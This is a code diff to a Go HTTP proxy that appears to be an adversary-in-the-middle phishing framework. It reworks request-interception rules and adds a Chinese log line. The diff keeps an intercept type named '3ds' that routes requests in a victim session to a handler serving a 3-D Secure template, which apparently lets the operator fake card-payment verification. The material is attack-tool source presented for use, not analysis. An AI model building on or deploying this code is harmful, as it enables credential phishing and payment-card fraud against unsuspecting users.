@@ -1262,33 +1262,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if request should be intercepted
 				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-						for _, ic := range pl.intercept {
-							// Build full path including query string for matching
-							full_path := req.URL.Path
-							if req.URL.RawQuery != "" {
-								full_path = req.URL.Path + "?" + req.URL.RawQuery
+					r_host := req.Host
+					for _, ic := range pl.intercept {
+						// Build full path including query string for matching
+						full_path := req.URL.Path
+						if req.URL.RawQuery != "" {
+							full_path = req.URL.Path + "?" + req.URL.RawQuery
+						}
+						log.Info("判断请求拦截：(domain=%s, path=%s) fullPath=%s", ic.domain, ic.path.String(), full_path)
+						if ic.domain == r_host && ic.path.MatchString(full_path) {
+							if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
+								continue
 							}
-							if ic.domain == r_host && ic.path.MatchString(full_path) {
-								if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
-									continue
-								}
-								switch ic.type_ {
-								case "3ds":
-									if ic.template == "" {
-										log.Error("intercept: type=3ds requires 'template' field (domain=%s, path=%s)", ic.domain, ic.path.String())
-										return req, nil
-									}
-									if p.threeDS != nil && ps.SessionId != "" {
-										return p.handle3DSIntercept(req, ps.SessionId, ic.template, pl.Name)
-									}
+							switch ic.type_ {
+							case "3ds":
+								if ic.template == "" {
+									log.Error("intercept: type=3ds requires 'template' field (domain=%s, path=%s)", ic.domain, ic.path.String())
 									return req, nil
-								case "static", "":
-									return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-								default:
-									log.Warning("intercept: unknown type '%s', falling back to static (domain=%s, path=%s)", ic.type_, ic.domain, ic.path.String())
-									return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 								}
+								if p.threeDS != nil && ps.SessionId != "" {
+									return p.handle3DSIntercept(req, ps.SessionId, ic.template, pl.Name)
+								}
+								return req, nil
+							case "static", "":
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							default:
+								log.Warning("intercept: unknown type '%s', falling back to static (domain=%s, path=%s)", ic.type_, ic.domain, ic.path.String())
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 							}
 						}
 					}
